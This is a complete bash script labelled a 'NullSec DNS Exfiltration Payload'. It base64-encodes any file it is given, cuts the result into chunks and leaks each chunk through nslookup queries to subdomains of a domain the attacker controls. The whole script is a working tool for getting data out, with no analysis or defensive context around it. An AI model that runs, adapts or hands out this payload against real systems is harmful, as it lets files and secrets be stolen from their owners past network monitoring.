#!/bin/bash
# NullSec DNS Exfiltration Payload
# Exfiltrates data via DNS queries

EXFIL_DOMAIN="$1"
DATA_FILE="$2"

if [[ -z "$EXFIL_DOMAIN" ]] || [[ -z "$DATA_FILE" ]]; then
    echo "Usage: $0 <domain> <data_file>"
    exit 1
fi

if [[ ! -f "$DATA_FILE" ]]; then
    echo "[-] File not found: $DATA_FILE"
    exit 1
fi

echo "[*] NullSec DNS Exfil"
echo "[*] Domain: $EXFIL_DOMAIN"
echo "[*] File: $DATA_FILE"

# Base64 encode and chunk
DATA=$(base64 -w0 "$DATA_FILE")
CHUNK_SIZE=60
COUNTER=0

while [[ -n "$DATA" ]]; do
    CHUNK="${DATA:0:$CHUNK_SIZE}"
    DATA="${DATA:$CHUNK_SIZE}"
    
    # Send as DNS query
    nslookup "${COUNTER}.${CHUNK}.${EXFIL_DOMAIN}" 2>/dev/null
    ((COUNTER++))
    sleep 0.1
done

echo "[+] Exfiltrated $COUNTER chunks"
